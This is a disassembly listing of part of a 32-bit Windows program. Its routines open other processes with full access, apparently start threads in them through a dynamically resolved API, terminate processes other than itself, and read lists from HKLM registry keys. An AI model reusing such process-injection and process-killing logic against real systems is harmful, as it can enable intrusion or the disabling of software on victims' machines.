  402d7c:	66 89 4e fc          	mov    %cx,-0x4(%esi)
  402d80:	66 3b c8             	cmp    %ax,%cx
  402d83:	75 23                	jne    0x402da8
  402d85:	8b 85 3e fe ff ff    	mov    -0x1c2(%ebp),%eax
  402d8b:	42                   	inc    %edx
  402d8c:	8b 8d 42 fe ff ff    	mov    -0x1be(%ebp),%ecx
  402d92:	89 06                	mov    %eax,(%esi)
  402d94:	89 4e 04             	mov    %ecx,0x4(%esi)
  402d97:	83 c6 10             	add    $0x10,%esi
  402d9a:	89 95 ec fd ff ff    	mov    %edx,-0x214(%ebp)
  402da0:	89 b5 e4 fd ff ff    	mov    %esi,-0x21c(%ebp)
  402da6:	eb 38                	jmp    0x402de0
  402da8:	0f 57 c0             	xorps  %xmm0,%xmm0
  402dab:	42                   	inc    %edx
  402dac:	66 0f 13 85 e0 fd ff 	movlpd %xmm0,-0x220(%ebp)
  402db3:	ff 
  402db4:	8b 8d e4 fd ff ff    	mov    -0x21c(%ebp),%ecx
  402dba:	8b 85 e0 fd ff ff    	mov    -0x220(%ebp),%eax
  402dc0:	89 06                	mov    %eax,(%esi)
  402dc2:	89 4e 04             	mov    %ecx,0x4(%esi)
  402dc5:	83 c6 10             	add    $0x10,%esi
  402dc8:	89 95 ec fd ff ff    	mov    %edx,-0x214(%ebp)
  402dce:	89 b5 e4 fd ff ff    	mov    %esi,-0x21c(%ebp)
  402dd4:	eb 0a                	jmp    0x402de0
  402dd6:	c7 85 d8 fd ff ff 00 	movl   $0x0,-0x228(%ebp)
  402ddd:	00 00 00 
  402de0:	57                   	push   %edi
  402de1:	ff 15 18 f1 40 00    	call   *0x40f118
  402de7:	43                   	inc    %ebx
  402de8:	3b 9d f4 fd ff ff    	cmp    -0x20c(%ebp),%ebx
  402dee:	0f 82 ad fe ff ff    	jb     0x402ca1
  402df4:	8b bd ec fd ff ff    	mov    -0x214(%ebp),%edi
  402dfa:	5b                   	pop    %ebx
  402dfb:	ff b5 f0 fd ff ff    	push   -0x210(%ebp)
  402e01:	e8 4d 09 00 00       	call   0x403753
  402e06:	ff b5 e8 fd ff ff    	push   -0x218(%ebp)
  402e0c:	e8 42 09 00 00       	call   0x403753
  402e11:	8b 85 dc fd ff ff    	mov    -0x224(%ebp),%eax
  402e17:	83 c4 08             	add    $0x8,%esp
  402e1a:	8b 4d fc             	mov    -0x4(%ebp),%ecx
  402e1d:	33 cd                	xor    %ebp,%ecx
  402e1f:	89 38                	mov    %edi,(%eax)
  402e21:	8b 85 d8 fd ff ff    	mov    -0x228(%ebp),%eax
  402e27:	5f                   	pop    %edi
  402e28:	5e                   	pop    %esi
  402e29:	e8 17 09 00 00       	call   0x403745
  402e2e:	8b e5                	mov    %ebp,%esp
  402e30:	5d                   	pop    %ebp
  402e31:	c3                   	ret
  402e32:	cc                   	int3
  402e33:	cc                   	int3
  402e34:	cc                   	int3
  402e35:	cc                   	int3
  402e36:	cc                   	int3
  402e37:	cc                   	int3
  402e38:	cc                   	int3
  402e39:	cc                   	int3
  402e3a:	cc                   	int3
  402e3b:	cc                   	int3
  402e3c:	cc                   	int3
  402e3d:	cc                   	int3
  402e3e:	cc                   	int3
  402e3f:	cc                   	int3
  402e40:	55                   	push   %ebp
  402e41:	8b ec                	mov    %esp,%ebp
  402e43:	83 ec 08             	sub    $0x8,%esp
  402e46:	a1 04 60 41 00       	mov    0x416004,%eax
  402e4b:	33 c5                	xor    %ebp,%eax
  402e4d:	89 45 fc             	mov    %eax,-0x4(%ebp)
  402e50:	56                   	push   %esi
  402e51:	57                   	push   %edi
  402e52:	8b f9                	mov    %ecx,%edi
  402e54:	b8 77 72 00 00       	mov    $0x7277,%eax
  402e59:	33 f6                	xor    %esi,%esi
  402e5b:	66 39 47 04          	cmp    %ax,0x4(%edi)
  402e5f:	0f 85 84 00 00 00    	jne    0x402ee9
  402e65:	53                   	push   %ebx
  402e66:	ff 37                	push   (%edi)
  402e68:	56                   	push   %esi
  402e69:	68 ff ff 1f 00       	push   $0x1fffff
  402e6e:	ff 15 68 f0 40 00    	call   *0x40f068
  402e74:	8b d8                	mov    %eax,%ebx
  402e76:	85 db                	test   %ebx,%ebx
  402e78:	74 5c                	je     0x402ed6
  402e7a:	8b 7f 08             	mov    0x8(%edi),%edi
  402e7d:	68 d8 40 41 00       	push   $0x4140d8
  402e82:	89 75 f8             	mov    %esi,-0x8(%ebp)
  402e85:	ff 15 60 f0 40 00    	call   *0x40f060
  402e8b:	85 c0                	test   %eax,%eax
  402e8d:	74 0e                	je     0x402e9d
  402e8f:	68 e4 40 41 00       	push   $0x4140e4
  402e94:	50                   	push   %eax
  402e95:	ff 15 8c f0 40 00    	call   *0x40f08c
  402e9b:	eb 02                	jmp    0x402e9f
  402e9d:	33 c0                	xor    %eax,%eax
  402e9f:	6a 00                	push   $0x0
  402ea1:	6a 00                	push   $0x0
  402ea3:	6a 00                	push   $0x0
  402ea5:	6a 00                	push   $0x0
  402ea7:	6a 00                	push   $0x0
  402ea9:	6a 00                	push   $0x0
  402eab:	57                   	push   %edi
  402eac:	53                   	push   %ebx
  402ead:	6a 00                	push   $0x0
  402eaf:	68 ff ff 1f 00       	push   $0x1fffff
  402eb4:	8d 4d f8             	lea    -0x8(%ebp),%ecx
  402eb7:	51                   	push   %ecx
  402eb8:	ff d0                	call   *%eax
  402eba:	8b 3d 18 f1 40 00    	mov    0x40f118,%edi
  402ec0:	85 c0                	test   %eax,%eax
  402ec2:	78 0f                	js     0x402ed3
  402ec4:	8b 4d f8             	mov    -0x8(%ebp),%ecx
  402ec7:	85 c9                	test   %ecx,%ecx
  402ec9:	74 08                	je     0x402ed3
  402ecb:	51                   	push   %ecx
  402ecc:	be 01 00 00 00       	mov    $0x1,%esi
  402ed1:	ff d7                	call   *%edi
  402ed3:	53                   	push   %ebx
  402ed4:	ff d7                	call   *%edi
  402ed6:	5b                   	pop    %ebx
  402ed7:	5f                   	pop    %edi
  402ed8:	8b c6                	mov    %esi,%eax
  402eda:	5e                   	pop    %esi
  402edb:	8b 4d fc             	mov    -0x4(%ebp),%ecx
  402ede:	33 cd                	xor    %ebp,%ecx
  402ee0:	e8 60 08 00 00       	call   0x403745
  402ee5:	8b e5                	mov    %ebp,%esp
  402ee7:	5d                   	pop    %ebp
  402ee8:	c3                   	ret
  402ee9:	8b 4d fc             	mov    -0x4(%ebp),%ecx
  402eec:	8b c6                	mov    %esi,%eax
  402eee:	5f                   	pop    %edi
  402eef:	33 cd                	xor    %ebp,%ecx
  402ef1:	5e                   	pop    %esi
  402ef2:	e8 4e 08 00 00       	call   0x403745
  402ef7:	8b e5                	mov    %ebp,%esp
  402ef9:	5d                   	pop    %ebp
  402efa:	c3                   	ret
  402efb:	cc                   	int3
  402efc:	cc                   	int3
  402efd:	cc                   	int3
  402efe:	cc                   	int3
  402eff:	cc                   	int3
  402f00:	55                   	push   %ebp
  402f01:	8b ec                	mov    %esp,%ebp
  402f03:	51                   	push   %ecx
  402f04:	53                   	push   %ebx
  402f05:	68 80 3e 00 00       	push   $0x3e80
  402f0a:	e8 49 08 00 00       	call   0x403758
  402f0f:	83 c4 04             	add    $0x4,%esp
  402f12:	c7 45 fc e8 03 00 00 	movl   $0x3e8,-0x4(%ebp)
  402f19:	8b d8                	mov    %eax,%ebx
  402f1b:	8d 55 fc             	lea    -0x4(%ebp),%edx
  402f1e:	8b cb                	mov    %ebx,%ecx
  402f20:	e8 db fc ff ff       	call   0x402c00
  402f25:	85 c0                	test   %eax,%eax
  402f27:	74 33                	je     0x402f5c
  402f29:	57                   	push   %edi
  402f2a:	8b 7d fc             	mov    -0x4(%ebp),%edi
  402f2d:	85 ff                	test   %edi,%edi
  402f2f:	74 2a                	je     0x402f5b
  402f31:	56                   	push   %esi
  402f32:	8b f3                	mov    %ebx,%esi
  402f34:	b8 77 72 00 00       	mov    $0x7277,%eax
  402f39:	0f 1f 80 00 00 00 00 	nopl   0x0(%eax)
  402f40:	66 39 46 04          	cmp    %ax,0x4(%esi)
  402f44:	75 0c                	jne    0x402f52
  402f46:	8b ce                	mov    %esi,%ecx
  402f48:	e8 f3 fe ff ff       	call   0x402e40
  402f4d:	b8 77 72 00 00       	mov    $0x7277,%eax
  402f52:	83 c6 10             	add    $0x10,%esi
  402f55:	83 ef 01             	sub    $0x1,%edi
  402f58:	75 e6                	jne    0x402f40
  402f5a:	5e                   	pop    %esi
  402f5b:	5f                   	pop    %edi
  402f5c:	53                   	push   %ebx
  402f5d:	e8 f1 07 00 00       	call   0x403753
  402f62:	83 c4 04             	add    $0x4,%esp
  402f65:	5b                   	pop    %ebx
  402f66:	8b e5                	mov    %ebp,%esp
  402f68:	5d                   	pop    %ebp
  402f69:	c3                   	ret
  402f6a:	cc                   	int3
  402f6b:	cc                   	int3
  402f6c:	cc                   	int3
  402f6d:	cc                   	int3
  402f6e:	cc                   	int3
  402f6f:	cc                   	int3
  402f70:	55                   	push   %ebp
  402f71:	8b ec                	mov    %esp,%ebp
  402f73:	83 ec 0c             	sub    $0xc,%esp
  402f76:	56                   	push   %esi
  402f77:	57                   	push   %edi
  402f78:	8b f9                	mov    %ecx,%edi
  402f7a:	68 80 3e 00 00       	push   $0x3e80
  402f7f:	89 7d f8             	mov    %edi,-0x8(%ebp)
  402f82:	e8 d1 07 00 00       	call   0x403758
  402f87:	8b f0                	mov    %eax,%esi
  402f89:	c7 45 fc e8 03 00 00 	movl   $0x3e8,-0x4(%ebp)
  402f90:	83 c4 04             	add    $0x4,%esp
  402f93:	89 75 f4             	mov    %esi,-0xc(%ebp)
  402f96:	8d 55 fc             	lea    -0x4(%ebp),%edx
  402f99:	8b ce                	mov    %esi,%ecx
  402f9b:	e8 60 fc ff ff       	call   0x402c00
  402fa0:	85 c0                	test   %eax,%eax
  402fa2:	74 4e                	je     0x402ff2
  402fa4:	53                   	push   %ebx
  402fa5:	8b 5d fc             	mov    -0x4(%ebp),%ebx
  402fa8:	85 db                	test   %ebx,%ebx
  402faa:	74 45                	je     0x402ff1
  402fac:	b9 73 72 00 00       	mov    $0x7273,%ecx
  402fb1:	66 39 4e 04          	cmp    %cx,0x4(%esi)
  402fb5:	75 2f                	jne    0x402fe6
  402fb7:	8b 06                	mov    (%esi),%eax
  402fb9:	3b c7                	cmp    %edi,%eax
  402fbb:	74 29                	je     0x402fe6
  402fbd:	50                   	push   %eax
  402fbe:	6a 00                	push   $0x0
  402fc0:	6a 01                	push   $0x1
  402fc2:	ff 15 68 f0 40 00    	call   *0x40f068
  402fc8:	8b f8                	mov    %eax,%edi
  402fca:	85 ff                	test   %edi,%edi
  402fcc:	74 10                	je     0x402fde
  402fce:	6a 00                	push   $0x0
  402fd0:	57                   	push   %edi
  402fd1:	ff 15 ec f0 40 00    	call   *0x40f0ec
  402fd7:	57                   	push   %edi
  402fd8:	ff 15 18 f1 40 00    	call   *0x40f118
  402fde:	8b 7d f8             	mov    -0x8(%ebp),%edi
  402fe1:	b9 73 72 00 00       	mov    $0x7273,%ecx
  402fe6:	83 c6 10             	add    $0x10,%esi
  402fe9:	83 eb 01             	sub    $0x1,%ebx
  402fec:	75 c3                	jne    0x402fb1
  402fee:	8b 75 f4             	mov    -0xc(%ebp),%esi
  402ff1:	5b                   	pop    %ebx
  402ff2:	56                   	push   %esi
  402ff3:	e8 5b 07 00 00       	call   0x403753
  402ff8:	83 c4 04             	add    $0x4,%esp
  402ffb:	5f                   	pop    %edi
  402ffc:	5e                   	pop    %esi
  402ffd:	8b e5                	mov    %ebp,%esp
  402fff:	5d                   	pop    %ebp
  403000:	c3                   	ret
  403001:	cc                   	int3
  403002:	cc                   	int3
  403003:	cc                   	int3
  403004:	cc                   	int3
  403005:	cc                   	int3
  403006:	cc                   	int3
  403007:	cc                   	int3
  403008:	cc                   	int3
  403009:	cc                   	int3
  40300a:	cc                   	int3
  40300b:	cc                   	int3
  40300c:	cc                   	int3
  40300d:	cc                   	int3
  40300e:	cc                   	int3
  40300f:	cc                   	int3
  403010:	55                   	push   %ebp
  403011:	8b ec                	mov    %esp,%ebp
  403013:	83 ec 28             	sub    $0x28,%esp
  403016:	a1 04 60 41 00       	mov    0x416004,%eax
  40301b:	33 c5                	xor    %ebp,%eax
  40301d:	89 45 fc             	mov    %eax,-0x4(%ebp)
  403020:	53                   	push   %ebx
  403021:	56                   	push   %esi
  403022:	57                   	push   %edi
  403023:	6a 20                	push   $0x20
  403025:	e8 37 07 00 00       	call   0x403761
  40302a:	8b f8                	mov    %eax,%edi
  40302c:	0f 57 c0             	xorps  %xmm0,%xmm0
  40302f:	6a 10                	push   $0x10
  403031:	0f 11 07             	movups %xmm0,(%edi)
  403034:	0f 11 47 10          	movups %xmm0,0x10(%edi)
  403038:	e8 24 07 00 00       	call   0x403761
  40303d:	8b f0                	mov    %eax,%esi
  40303f:	6a 40                	push   $0x40
  403041:	c7 46 0c 00 00 00 00 	movl   $0x0,0xc(%esi)
  403048:	c7 06 00 00 00 00    	movl   $0x0,(%esi)
  40304e:	c7 46 04 10 00 00 00 	movl   $0x10,0x4(%esi)
  403055:	c7 46 08 01 00 00 00 	movl   $0x1,0x8(%esi)
  40305c:	e8 f7 06 00 00       	call   0x403758
  403061:	89 46 0c             	mov    %eax,0xc(%esi)
  403064:	6a 0c                	push   $0xc
  403066:	89 37                	mov    %esi,(%edi)
  403068:	e8 f4 06 00 00       	call   0x403761
  40306d:	8b f0                	mov    %eax,%esi
  40306f:	6a 40                	push   $0x40
  403071:	c7 46 08 00 00 00 00 	movl   $0x0,0x8(%esi)
  403078:	c7 06 00 00 00 00    	movl   $0x0,(%esi)
  40307e:	c7 46 04 10 00 00 00 	movl   $0x10,0x4(%esi)
  403085:	e8 ce 06 00 00       	call   0x403758
  40308a:	89 46 08             	mov    %eax,0x8(%esi)
  40308d:	6a 10                	push   $0x10
  40308f:	89 77 04             	mov    %esi,0x4(%edi)
  403092:	e8 ca 06 00 00       	call   0x403761
  403097:	8b f0                	mov    %eax,%esi
  403099:	6a 40                	push   $0x40
  40309b:	c7 46 0c 00 00 00 00 	movl   $0x0,0xc(%esi)
  4030a2:	c7 06 00 00 00 00    	movl   $0x0,(%esi)
  4030a8:	c7 46 04 10 00 00 00 	movl   $0x10,0x4(%esi)
  4030af:	c7 46 08 01 00 00 00 	movl   $0x1,0x8(%esi)
  4030b6:	e8 9d 06 00 00       	call   0x403758
  4030bb:	89 46 0c             	mov    %eax,0xc(%esi)
  4030be:	6a 10                	push   $0x10
  4030c0:	89 77 08             	mov    %esi,0x8(%edi)
  4030c3:	e8 99 06 00 00       	call   0x403761
  4030c8:	8b f0                	mov    %eax,%esi
  4030ca:	6a 40                	push   $0x40
  4030cc:	c7 46 0c 00 00 00 00 	movl   $0x0,0xc(%esi)
  4030d3:	c7 06 00 00 00 00    	movl   $0x0,(%esi)
  4030d9:	c7 46 04 10 00 00 00 	movl   $0x10,0x4(%esi)
  4030e0:	c7 46 08 01 00 00 00 	movl   $0x1,0x8(%esi)
  4030e7:	e8 6c 06 00 00       	call   0x403758
  4030ec:	89 46 0c             	mov    %eax,0xc(%esi)
  4030ef:	6a 10                	push   $0x10
  4030f1:	89 77 0c             	mov    %esi,0xc(%edi)
  4030f4:	e8 68 06 00 00       	call   0x403761
  4030f9:	8b f0                	mov    %eax,%esi
  4030fb:	6a 40                	push   $0x40
  4030fd:	c7 46 0c 00 00 00 00 	movl   $0x0,0xc(%esi)
  403104:	c7 06 00 00 00 00    	movl   $0x0,(%esi)
  40310a:	c7 46 04 10 00 00 00 	movl   $0x10,0x4(%esi)
  403111:	c7 46 08 01 00 00 00 	movl   $0x1,0x8(%esi)
  403118:	e8 3b 06 00 00       	call   0x403758
  40311d:	89 46 0c             	mov    %eax,0xc(%esi)
  403120:	6a 0c                	push   $0xc
  403122:	89 77 10             	mov    %esi,0x10(%edi)
  403125:	e8 37 06 00 00       	call   0x403761
  40312a:	8b f0                	mov    %eax,%esi
  40312c:	6a 40                	push   $0x40
  40312e:	c7 46 08 00 00 00 00 	movl   $0x0,0x8(%esi)
  403135:	c7 06 00 00 00 00    	movl   $0x0,(%esi)
  40313b:	c7 46 04 10 00 00 00 	movl   $0x10,0x4(%esi)
  403142:	e8 11 06 00 00       	call   0x403758
  403147:	89 46 08             	mov    %eax,0x8(%esi)
  40314a:	6a 0c                	push   $0xc
  40314c:	89 77 14             	mov    %esi,0x14(%edi)
  40314f:	e8 0d 06 00 00       	call   0x403761
  403154:	8b f0                	mov    %eax,%esi
  403156:	6a 40                	push   $0x40
  403158:	c7 46 08 00 00 00 00 	movl   $0x0,0x8(%esi)
  40315f:	c7 06 00 00 00 00    	movl   $0x0,(%esi)
  403165:	c7 46 04 10 00 00 00 	movl   $0x10,0x4(%esi)
  40316c:	e8 e7 05 00 00       	call   0x403758
  403171:	89 46 08             	mov    %eax,0x8(%esi)
  403174:	6a 0c                	push   $0xc
  403176:	89 77 18             	mov    %esi,0x18(%edi)
  403179:	e8 e3 05 00 00       	call   0x403761
  40317e:	8b f0                	mov    %eax,%esi
  403180:	83 c4 40             	add    $0x40,%esp
  403183:	c7 46 08 00 00 00 00 	movl   $0x0,0x8(%esi)
  40318a:	6a 40                	push   $0x40
  40318c:	c7 06 00 00 00 00    	movl   $0x0,(%esi)
  403192:	c7 46 04 10 00 00 00 	movl   $0x10,0x4(%esi)
  403199:	e8 ba 05 00 00       	call   0x403758
  40319e:	8b 1d 50 f0 40 00    	mov    0x40f050,%ebx
  4031a4:	83 c4 04             	add    $0x4,%esp
  4031a7:	89 46 08             	mov    %eax,0x8(%esi)
  4031aa:	8d 45 f8             	lea    -0x8(%ebp),%eax
  4031ad:	89 77 1c             	mov    %esi,0x1c(%edi)
  4031b0:	50                   	push   %eax
  4031b1:	68 19 01 02 00       	push   $0x20119
  4031b6:	6a 00                	push   $0x0
  4031b8:	68 74 3f 41 00       	push   $0x413f74
  4031bd:	68 02 00 00 80       	push   $0x80000002
  4031c2:	ff d3                	call   *%ebx
  4031c4:	85 c0                	test   %eax,%eax
  4031c6:	0f 85 62 01 00 00    	jne    0x40332e
  4031cc:	8d 45 f4             	lea    -0xc(%ebp),%eax
  4031cf:	50                   	push   %eax
  4031d0:	68 19 00 02 00       	push   $0x20019
  4031d5:	6a 00                	push   $0x0
  4031d7:	68 a0 3f 41 00       	push   $0x413fa0
  4031dc:	ff 75 f8             	push   -0x8(%ebp)
  4031df:	ff d3                	call   *%ebx
  4031e1:	8b 35 44 f0 40 00    	mov    0x40f044,%esi
  4031e7:	85 c0                	test   %eax,%eax
  4031e9:	75 13                	jne    0x4031fe
  4031eb:	8b 55 f4             	mov    -0xc(%ebp),%edx
  4031ee:	51                   	push   %ecx
  4031ef:	8b 0f                	mov    (%edi),%ecx
  4031f1:	e8 4a f8 ff ff       	call   0x402a40
  4031f6:	83 c4 04             	add    $0x4,%esp
  4031f9:	ff 75 f4             	push   -0xc(%ebp)
  4031fc:	ff d6                	call   *%esi
  4031fe:	8d 45 f0             	lea    -0x10(%ebp),%eax
  403201:	50                   	push   %eax
  403202:	68 19 00 02 00       	push   $0x20019
  403207:	6a 00                	push   $0x0
  403209:	68 c0 3d 41 00       	push   $0x413dc0
  40320e:	ff 75 f8             	push   -0x8(%ebp)
  403211:	ff d3                	call   *%ebx
  403213:	85 c0                	test   %eax,%eax
  403215:	75 10                	jne    0x403227
  403217:	8b 55 f0             	mov    -0x10(%ebp),%edx
  40321a:	8b 4f 04             	mov    0x4(%edi),%ecx
  40321d:	e8 ce f6 ff ff       	call   0x4028f0
  403222:	ff 75 f0             	push   -0x10(%ebp)
  403225:	ff d6                	call   *%esi
  403227:	8d 45 ec             	lea    -0x14(%ebp),%eax
  40322a:	50                   	push   %eax
  40322b:	68 19 00 02 00       	push   $0x20019
  403230:	6a 00                	push   $0x0
  403232:	68 b0 3f 41 00       	push   $0x413fb0
  403237:	ff 75 f8             	push   -0x8(%ebp)
  40323a:	ff d3                	call   *%ebx
  40323c:	85 c0                	test   %eax,%eax
  40323e:	75 14                	jne    0x403254
  403240:	8b 55 ec             	mov    -0x14(%ebp),%edx
  403243:	51                   	push   %ecx
  403244:	8b 4f 08             	mov    0x8(%edi),%ecx
  403247:	e8 f4 f7 ff ff       	call   0x402a40
  40324c:	83 c4 04             	add    $0x4,%esp
  40324f:	ff 75 ec             	push   -0x14(%ebp)
  403252:	ff d6                	call   *%esi
  403254:	8d 45 e8             	lea    -0x18(%ebp),%eax
  403257:	50                   	push   %eax
  403258:	68 19 00 02 00       	push   $0x20019
  40325d:	6a 00                	push   $0x0
  40325f:	68 cc 3f 41 00       	push   $0x413fcc
  403264:	ff 75 f8             	push   -0x8(%ebp)
  403267:	ff d3                	call   *%ebx
  403269:	85 c0                	test   %eax,%eax
  40326b:	75 14                	jne    0x403281
  40326d:	8b 55 e8             	mov    -0x18(%ebp),%edx
  403270:	51                   	push   %ecx
  403271:	8b 4f 0c             	mov    0xc(%edi),%ecx
  403274:	e8 c7 f7 ff ff       	call   0x402a40
  403279:	83 c4 04             	add    $0x4,%esp
  40327c:	ff 75 e8             	push   -0x18(%ebp)
  40327f:	ff d6                	call   *%esi
  403281:	8d 45 e4             	lea    -0x1c(%ebp),%eax
  403284:	50                   	push   %eax
  403285:	68 19 00 02 00       	push   $0x20019
  40328a:	6a 00                	push   $0x0
  40328c:	68 d8 3f 41 00       	push   $0x413fd8
  403291:	ff 75 f8             	push   -0x8(%ebp)
  403294:	ff d3                	call   *%ebx
  403296:	85 c0                	test   %eax,%eax
  403298:	75 14                	jne    0x4032ae
  40329a:	8b 55 e4             	mov    -0x1c(%ebp),%edx
  40329d:	51                   	push   %ecx
  40329e:	8b 4f 10             	mov    0x10(%edi),%ecx
  4032a1:	e8 9a f7 ff ff       	call   0x402a40
  4032a6:	83 c4 04             	add    $0x4,%esp
  4032a9:	ff 75 e4             	push   -0x1c(%ebp)
  4032ac:	ff d6                	call   *%esi
  4032ae:	8d 45 e0             	lea    -0x20(%ebp),%eax
  4032b1:	50                   	push   %eax
  4032b2:	68 19 00 02 00       	push   $0x20019
  4032b7:	6a 00                	push   $0x0
  4032b9:	68 f4 3f 41 00       	push   $0x413ff4
  4032be:	ff 75 f8             	push   -0x8(%ebp)
  4032c1:	ff d3                	call   *%ebx
  4032c3:	85 c0                	test   %eax,%eax
  4032c5:	75 10                	jne    0x4032d7
  4032c7:	8b 55 e0             	mov    -0x20(%ebp),%edx
  4032ca:	8b 4f 14             	mov    0x14(%edi),%ecx
  4032cd:	e8 1e f6 ff ff       	call   0x4028f0
  4032d2:	ff 75 e0             	push   -0x20(%ebp)
  4032d5:	ff d6                	call   *%esi
  4032d7:	8d 45 dc             	lea    -0x24(%ebp),%eax
  4032da:	50                   	push   %eax
  4032db:	68 19 00 02 00       	push   $0x20019
  4032e0:	6a 00                	push   $0x0
  4032e2:	68 08 40 41 00       	push   $0x414008
  4032e7:	ff 75 f8             	push   -0x8(%ebp)
  4032ea:	ff d3                	call   *%ebx
  4032ec:	85 c0                	test   %eax,%eax
  4032ee:	75 10                	jne    0x403300
  4032f0:	8b 55 dc             	mov    -0x24(%ebp),%edx
  4032f3:	8b 4f 18             	mov    0x18(%edi),%ecx
  4032f6:	e8 f5 f5 ff ff       	call   0x4028f0
  4032fb:	ff 75 dc             	push   -0x24(%ebp)
  4032fe:	ff d6                	call   *%esi
  403300:	8d 45 d8             	lea    -0x28(%ebp),%eax
  403303:	50                   	push   %eax
  403304:	68 19 00 02 00       	push   $0x20019
  403309:	6a 00                	push   $0x0
  40330b:	68 20 40 41 00       	push   $0x414020
  403310:	ff 75 f8             	push   -0x8(%ebp)
  403313:	ff d3                	call   *%ebx
  403315:	85 c0                	test   %eax,%eax
  403317:	75 10                	jne    0x403329
  403319:	8b 55 d8             	mov    -0x28(%ebp),%edx
  40331c:	8b 4f 1c             	mov    0x1c(%edi),%ecx
  40331f:	e8 cc f5 ff ff       	call   0x4028f0
  403324:	ff 75 d8             	push   -0x28(%ebp)
  403327:	ff d6                	call   *%esi
  403329:	ff 75 f8             	push   -0x8(%ebp)
  40332c:	ff d6                	call   *%esi
  40332e:	8b 4d fc             	mov    -0x4(%ebp),%ecx
  403331:	8b c7                	mov    %edi,%eax
  403333:	5f                   	pop    %edi
  403334:	5e                   	pop    %esi
  403335:	33 cd                	xor    %ebp,%ecx
  403337:	5b                   	pop    %ebx
  403338:	e8 08 04 00 00       	call   0x403745
  40333d:	8b e5                	mov    %ebp,%esp
  40333f:	5d                   	pop    %ebp
  403340:	c3                   	ret
  403341:	cc                   	int3
  403342:	cc                   	int3
  403343:	cc                   	int3
  403344:	cc                   	int3
  403345:	cc                   	int3
  403346:	cc                   	int3
  403347:	cc                   	int3
  403348:	cc                   	int3
  403349:	cc                   	int3
  40334a:	cc                   	int3
  40334b:	cc                   	int3
  40334c:	cc                   	int3
  40334d:	cc                   	int3
  40334e:	cc                   	int3
  40334f:	cc                   	int3
  403350:	53                   	push   %ebx
  403351:	8b d9                	mov    %ecx,%ebx
  403353:	56                   	push   %esi
  403354:	57                   	push   %edi
  403355:	33 f6                	xor    %esi,%esi
  403357:	8b 3b                	mov    (%ebx),%edi
  403359:	39 37                	cmp    %esi,(%edi)
  40335b:	76 16                	jbe    0x403373
  40335d:	0f 1f 00             	nopl   (%eax)
  403360:	8b 47 0c             	mov    0xc(%edi),%eax
  403363:	ff 34 b0             	push   (%eax,%esi,4)
  403366:	e8 e8 03 00 00       	call   0x403753
  40336b:	46                   	inc    %esi
  40336c:	83 c4 04             	add    $0x4,%esp
  40336f:	3b 37                	cmp    (%edi),%esi
  403371:	72 ed                	jb     0x403360
  403373:	ff 77 0c             	push   0xc(%edi)
  403376:	e8 d8 03 00 00       	call   0x403753
  40337b:	0f 57 c0             	xorps  %xmm0,%xmm0
  40337e:	6a 10                	push   $0x10
  403380:	57                   	push   %edi
  403381:	0f 11 07             	movups %xmm0,(%edi)
  403384:	e8 08 04 00 00       	call   0x403791
  403389:	8b 73 04             	mov    0x4(%ebx),%esi
  40338c:	ff 76 08             	push   0x8(%esi)
  40338f:	e8 bf 03 00 00       	call   0x403753
  403394:	0f 57 c0             	xorps  %xmm0,%xmm0
  403397:	6a 0c                	push   $0xc
  403399:	66 0f d6 06          	movq   %xmm0,(%esi)
  40339d:	56                   	push   %esi
  40339e:	c7 46 08 00 00 00 00 	movl   $0x0,0x8(%esi)
  4033a5:	e8 e7 03 00 00       	call   0x403791
  4033aa:	8b 7b 08             	mov    0x8(%ebx),%edi
  4033ad:	33 f6                	xor    %esi,%esi
  4033af:	83 c4 18             	add    $0x18,%esp
  4033b2:	39 37                	cmp    %esi,(%edi)
  4033b4:	76 1d                	jbe    0x4033d3
  4033b6:	66 66 0f 1f 84 00 00 	data16 nopw 0x0(%eax,%eax,1)
  4033bd:	00 00 00 
  4033c0:	8b 47 0c             	mov    0xc(%edi),%eax
  4033c3:	ff 34 b0             	push   (%eax,%esi,4)
  4033c6:	e8 88 03 00 00       	call   0x403753
  4033cb:	46                   	inc    %esi
  4033cc:	83 c4 04             	add    $0x4,%esp
  4033cf:	3b 37                	cmp    (%edi),%esi
  4033d1:	72 ed                	jb     0x4033c0
  4033d3:	ff 77 0c             	push   0xc(%edi)
  4033d6:	e8 78 03 00 00       	call   0x403753
  4033db:	0f 57 c0             	xorps  %xmm0,%xmm0
  4033de:	6a 10                	push   $0x10
  4033e0:	57                   	push   %edi
  4033e1:	0f 11 07             	movups %xmm0,(%edi)
  4033e4:	e8 a8 03 00 00       	call   0x403791
  4033e9:	8b 7b 0c             	mov    0xc(%ebx),%edi
  4033ec:	33 f6                	xor    %esi,%esi
  4033ee:	83 c4 0c             	add    $0xc,%esp
  4033f1:	39 37                	cmp    %esi,(%edi)
  4033f3:	76 13                	jbe    0x403408
  4033f5:	8b 47 0c             	mov    0xc(%edi),%eax
  4033f8:	ff 34 b0             	push   (%eax,%esi,4)
  4033fb:	e8 53 03 00 00       	call   0x403753
  403400:	46                   	inc    %esi
  403401:	83 c4 04             	add    $0x4,%esp
  403404:	3b 37                	cmp    (%edi),%esi
  403406:	72 ed                	jb     0x4033f5
  403408:	ff 77 0c             	push   0xc(%edi)
  40340b:	e8 43 03 00 00       	call   0x403753
  403410:	0f 57 c0             	xorps  %xmm0,%xmm0
  403413:	6a 10                	push   $0x10
  403415:	57                   	push   %edi
  403416:	0f 11 07             	movups %xmm0,(%edi)
  403419:	e8 73 03 00 00       	call   0x403791
  40341e:	8b 7b 10             	mov    0x10(%ebx),%edi
  403421:	33 f6                	xor    %esi,%esi
  403423:	83 c4 0c             	add    $0xc,%esp
  403426:	39 37                	cmp    %esi,(%edi)
  403428:	76 19                	jbe    0x403443
  40342a:	66 0f 1f 44 00 00    	nopw   0x0(%eax,%eax,1)
  403430:	8b 47 0c             	mov    0xc(%edi),%eax
  403433:	ff 34 b0             	push   (%eax,%esi,4)
  403436:	e8 18 03 00 00       	call   0x403753
  40343b:	46                   	inc    %esi
  40343c:	83 c4 04             	add    $0x4,%esp
  40343f:	3b 37                	cmp    (%edi),%esi
  403441:	72 ed                	jb     0x403430
  403443:	ff 77 0c             	push   0xc(%edi)
  403446:	e8 08 03 00 00       	call   0x403753
  40344b:	0f 57 c0             	xorps  %xmm0,%xmm0
  40344e:	6a 10                	push   $0x10
  403450:	57                   	push   %edi
  403451:	0f 11 07             	movups %xmm0,(%edi)
  403454:	e8 38 03 00 00       	call   0x403791
  403459:	8b 73 14             	mov    0x14(%ebx),%esi
  40345c:	ff 76 08             	push   0x8(%esi)
  40345f:	e8 ef 02 00 00       	call   0x403753
  403464:	0f 57 c0             	xorps  %xmm0,%xmm0
  403467:	6a 0c                	push   $0xc
  403469:	66 0f d6 06          	movq   %xmm0,(%esi)
